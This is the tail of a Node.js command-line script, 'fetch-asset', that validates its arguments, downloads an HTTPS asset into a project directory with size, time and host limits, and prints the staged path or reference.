    opts = parseArgv(process.argv.slice(2));
  } catch (err) {
    process.stderr.write(`fetch-asset: ${err.message}\n`);
    process.exit(err instanceof FetchAssetError ? err.code : 2);
  }
  if (opts.help) {
    process.stdout.write(`${HELP}\n`);
    return;
  }
  if (!opts.url) {
    process.stderr.write('fetch-asset: <https-url> required\n');
    process.exit(2);
  }
  const root = opts.root || process.env.CLAUDE_PROJECT_DIR || process.cwd();
  if (!Number.isFinite(opts.maxBytes) || opts.maxBytes <= 0) {
    process.stderr.write('fetch-asset: --max-bytes must be a positive number\n');
    process.exit(2);
  }
  if (!Number.isFinite(opts.maxTime) || opts.maxTime <= 0) {
    process.stderr.write('fetch-asset: --max-time must be a positive number\n');
    process.exit(2);
  }
  try {
    const r = await fetchAsset({
      url: opts.url,
      root,
      designRootRel: opts.designRoot,
      maxBytes: opts.maxBytes,
      maxTime: opts.maxTime,
      ...(opts.allowHosts ? { allowHosts: opts.allowHosts } : {}),
      ...(opts.pinPort443 ? { pinPort443: true } : {}),
      ...(opts.rawOut ? { rawOut: opts.rawOut } : {}),
      ...(opts.rawRoot ? { rawRoot: opts.rawRoot } : {}),
    });
    // `--raw-out` has no canvas ref (it deliberately writes outside `assets/`),
    // so print the staged path instead of a null.
    process.stdout.write(opts.json ? `${JSON.stringify(r)}\n` : `${r.ref ?? r.path}\n`);
  } catch (err) {
    process.stderr.write(`fetch-asset: ${err.message}\n`);
    process.exit(err instanceof FetchAssetError ? err.code : 1);
  }
}

// Run only when invoked directly (not when imported by the test). This shim runs
// under real `node` on a real on-disk path (never embedded in bun --compile), so
// the classic argv[1] guard is correct here — see the v0.38.0 self-heal memory.
if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main();
}
